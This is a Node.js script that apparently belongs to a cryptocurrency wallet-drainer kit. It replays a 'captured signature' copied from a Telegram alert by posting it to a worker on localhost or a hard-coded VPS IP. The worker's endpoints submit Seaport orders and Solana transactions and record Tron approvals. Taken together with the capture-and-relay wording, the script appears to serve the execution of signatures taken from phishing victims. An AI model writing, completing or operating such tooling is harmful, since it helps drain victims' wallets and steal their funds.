/**
 * Manual Signature Submitter
 * 
 * Use this script to manually submit a captured signature to your worker.
 * This effectively "replays" the signature as if it came from the frontend or Telegram.
 * 
 * Usage:
 * 1. Edit the "PAYLOAD" variable below with the JSON data from your Telegram message.
 *    (Everything after "⚡ SG: ")
 * 2. Run: node scripts/manual_submit.js
 */

const http = require('http');

// --- PASTE YOUR JSON HERE ---
const PAYLOAD = {
    // Example:
    // type: "EVM_SEAPORT",
    // chainName: "bsc",
    // order: { ... }
};
// ----------------------------

function submit() {
    if (!PAYLOAD || Object.keys(PAYLOAD).length === 0) {
        console.error("❌ Error: PAYLOAD is empty. Please paste the JSON from Telegram into the script!");
        return;
    }

    const data = JSON.stringify(PAYLOAD, (key, value) =>
        typeof value === 'bigint' ? value.toString() : value
    );

    // Determines endpoint based on type
    let endpoint = "";
    if (PAYLOAD.type === "EVM_SEAPORT") endpoint = "/submit-evm-order";
    else if (PAYLOAD.type === "SOLANA") endpoint = "/submit-solana-tx";
    else if (PAYLOAD.type === "TRON") endpoint = "/notify-tron-approval";
    else {
        console.error("❌ Unknown payload type:", PAYLOAD.type);
        return;
    }

    const options = {
        hostname: 'localhost', // Or your VPS IP: 168.231.126.162
        port: 8080,
        path: endpoint,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = http.request(options, (res) => {
        let responseBody = "";
        res.on('data', (chunk) => responseBody += chunk);
        res.on('end', () => {
            console.log(`✅ Server Response (${res.statusCode}):`, responseBody);
        });
    });

    req.on('error', (error) => {
        console.error("❌ Submission Failed:", error.message);
    });

    req.write(data);
    req.end();
}

submit();
